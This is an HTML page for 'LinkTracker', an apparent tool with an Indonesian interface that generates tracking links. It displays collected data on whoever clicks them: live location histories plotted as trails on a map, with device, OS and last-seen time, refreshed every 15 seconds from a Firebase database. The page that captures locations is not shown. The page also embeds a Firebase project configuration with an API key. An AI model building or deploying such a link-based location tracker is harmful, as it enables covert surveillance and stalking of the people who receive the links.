<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>LinkTracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        body { font-family: Arial, sans-serif; max-width: 1100px; margin: 0 auto; padding: 20px; }
        .container { border: 1px solid #ddd; padding: 20px; margin-bottom: 20px; border-radius: 8px; }
        input, button { padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; }
        button { background: #3498db; color: white; border: none; cursor: pointer; }
        .link-result { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 4px; }
        .location-data { background: #e8f4fc; padding: 15px; margin: 10px 0; border-radius: 4px; }
        .location-data p { font-size: 12px; margin: 2px 0; color: #333; }
        .location-data h3 { font-size: 14px; margin-top: 8px; margin-bottom: 4px; color: #0066cc; }
        #map { height: 400px; border-radius: 8px; margin-top: 10px; }
        .map-container { border: 1px solid #ddd; padding: 10px; border-radius: 8px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <h2>LinkTracker - Pembuat Tautan Pelacak</h2>
    
    <div class="container">
        <h3>Buat Tautan Pelacak Baru</h3>
        <input type="text" id="targetUrl" placeholder="https://example.com">
        <button id="createBtn">Buat Tautan Pelacak</button>
        
        <div id="generatedLink" class="link-result hidden">
            <h3>Tautan Pelacak Anda:</h3>
            <a id="trackableLink" target="_blank"></a>
        </div>
    </div>
    
    <div class="container">
        <h3>Data Lokasi yang Dikumpulkan</h3>
        <div id="locationData" class="location-data">
            <p>Belum ada data lokasi yang dikumpulkan.</p>
        </div>
    </div>

    <div id="mapWrapper" class="container map-container hidden">
        <h3>Peta Lokasi Klik</h3>
        <div id="map"></div>
    </div>

    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
      import {
        getFirestore,
        collection,
        addDoc,
        getDocs,
        query,
        orderBy
      } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

      const firebaseConfig = {
        apiKey: "AIzaSyAtTakF_Psb-yhxa5NFlcs3Tte5gjYe00",
        authDomain: "locked-1dfad.firebaseapp.com",
        projectId: "locked-1dfad",
        storageBucket: "locked-1dfad.appspot.com",
        messagingSenderId: "237366240355",
        appId: "1:237366240355:web:e3a4f999ff547a07398456",
        measurementId: "G-ZFQC67FMCV"
      };

      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);

      document.getElementById('createBtn').addEventListener('click', generateLink);

      async function generateLink() {
        const targetUrl = document.getElementById('targetUrl').value.trim();
        if (!targetUrl) return alert('Masukkan URL tujuan');
        const docRef = await addDoc(collection(db, "trackingLinks"), {
          targetUrl,
          createdAt: Date.now()
        });
        const linkId = docRef.id;
        const base = window.location.href.replace(/[^/]*$/, '');
        const trackableLink = base + 'track.html?id=' + linkId;
        document.getElementById('trackableLink').href = trackableLink;
        document.getElementById('trackableLink').textContent = trackableLink;
        document.getElementById('generatedLink').classList.remove('hidden');
      }

      async function updateLocationDataAndMap() {
        const locationDataDiv = document.getElementById('locationData');
        locationDataDiv.innerHTML = '';

        const q = query(collection(db, "trackingLinks"), orderBy("createdAt", "desc"));
        const snap = await getDocs(q);

        clearMapMarkers();
        let bounds = [];
        let hasData = false;

        for (const docSnap of snap.docs) {
          const linkId = docSnap.id;
          const linkData = docSnap.data();
          const linkHeader = document.createElement('h3');
          linkHeader.textContent = `Tautan: ${linkData.targetUrl}`;
          locationDataDiv.appendChild(linkHeader);

          // ambil subcollection liveClicks
          const liveSnap = await getDocs(collection(db, "trackingLinks", linkId, "liveClicks"));
          liveSnap.forEach(clickDoc => {
            const cdata = clickDoc.data();
            if (cdata.locationHistory && cdata.locationHistory.length > 0) {
              hasData = true;
              const coords = cdata.locationHistory.map(p => [p.latitude, p.longitude]);

              // garis merah
              L.polyline(coords, { color: 'red', weight: 3 }).addTo(markersLayer);
              bounds.push(...coords);

              // titik terakhir merah
              const last = coords[coords.length - 1];
              const marker = L.circleMarker(last, {
                color: 'red',
                radius: 6,
                weight: 2,
                fillColor: 'red',
                fillOpacity: 0.9
              }).addTo(markersLayer);
              marker.bindPopup(`Device: ${cdata.device || '-'}<br>OS: ${cdata.os || '-'}<br>Update: ${new Date(cdata.lastSeen).toLocaleTimeString()}`);
            }
          });
        }

        if (hasData) {
          document.getElementById('mapWrapper').classList.remove('hidden');
        } else {
          document.getElementById('mapWrapper').classList.add('hidden');
        }

        if (bounds.length > 0) {
          map.fitBounds(bounds, { maxZoom: 15, padding: [50,50] });
        }
      }

      function loadLeafletScript() {
        return new Promise((resolve, reject) => {
          if (window.L) return resolve();
          const s = document.createElement('script');
          s.src = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.js";
          s.onload = () => resolve();
          s.onerror = () => reject(new Error('Gagal load Leaflet'));
          document.head.appendChild(s);
        });
      }

      let map, markersLayer;
      async function initMap() {
        await loadLeafletScript();
        map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://cartodb-basemaps-a.global.ssl.fastly.net/light_all/{z}/{x}/{y}{r}.png', {
          attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/">CARTO</a>',
          subdomains: 'abcd',
          maxZoom: 19
        }).addTo(map);
        markersLayer = L.layerGroup().addTo(map);
      }

      function clearMapMarkers() {
        if (!markersLayer) return;
        markersLayer.clearLayers();
      }

      await initMap();
      updateLocationDataAndMap();
      setInterval(updateLocationDataAndMap, 15000);
    </script>
</body>
</html>
